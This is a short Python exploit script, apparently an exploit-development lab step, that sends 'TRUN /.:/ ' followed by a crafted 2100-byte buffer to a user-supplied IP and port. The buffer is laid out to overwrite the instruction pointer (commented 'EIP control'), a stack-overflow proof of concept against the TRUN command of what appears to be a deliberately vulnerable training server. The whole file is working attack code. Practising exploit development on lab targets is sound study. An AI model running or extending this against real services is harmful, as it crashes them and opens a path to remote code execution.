#!/usr/bin/python3

import sys,socket

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

def lines():
    print("*"*50)
if len(ip_address)==0 or len(port_number)==0:
    lines()
    print("User input missing, kindly check")
else:
    #EIP control 
    buffer_size=b"A"*2002 + b"B"*4 + b"C" *(2100-4-2002)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    s.send((b"TRUN /.:/ " + buffer_size))
    s.close()
